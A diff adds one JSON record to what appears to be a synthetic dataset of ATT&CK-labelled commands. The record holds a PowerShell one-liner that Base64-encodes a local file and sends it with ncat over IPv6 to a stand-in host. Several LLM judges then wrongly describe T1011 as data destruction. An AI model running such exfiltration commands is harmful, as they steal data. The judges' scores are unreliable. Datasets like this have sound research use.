@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$src=(Get-NetIPAddress -InterfaceAlias 'Wi-Fi' -AddressFamily IPv6 | ?{$_.AddressState -eq 'Preferred'} | Select-Object -First 1 -ExpandProperty IPAddress); $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -s $src 2001:db8:dead:beef::23 47017 --send-only",
+  "explanation": "Binds the exfiltration flow to the Wi-Fi IPv6 address (distinct network path) and sends Base64 data via ncat to a high, uncommon TCP port. This explicitly uses a different medium/interface than a likely primary wired channel, aligning with T1011.",
+  "rationale_steps": [
+    "Select Wi-Fi IPv6 address to force use of a different network medium/interface.",
+    "Send Base64 data via IPv6 TCP to a non-standard high port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-563bdea1",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced parentheses, proper variable assignments, correct piping, valid PowerShell syntax for retrieving network information, and proper use of ncat parameters.",
+        "semantic_score": 4,
+        "semantic_justification": "The command aligns with exfiltration over alternative protocol (T1011) by using IPv6 over Wi-Fi to send encoded data via ncat to a specific port, though it's not directly implementing data destruction as described in the technique description.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T01:48:32.552097Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct PowerShell syntax, balanced elements, valid parameters for cmdlets, and proper usage of the external ncat utility.",
+        "semantic_score": 0,
+        "semantic_justification": "The command explicitly performs data exfiltration by reading and sending a file's content, which is semantically unrelated and directly contradictory to the stated MITRE ATT&CK technique T1011 (Data Destruction).",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T01:48:37.312629Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes, valid cmdlets, and appropriate ncat flags and argument order; it should parse and run given ncat presence.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration over IPv6 bound to the Wi-Fi interface, not data destruction as described by the technique.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T01:48:47.876605Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.667,
+    "llm_average_score": 3.333,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
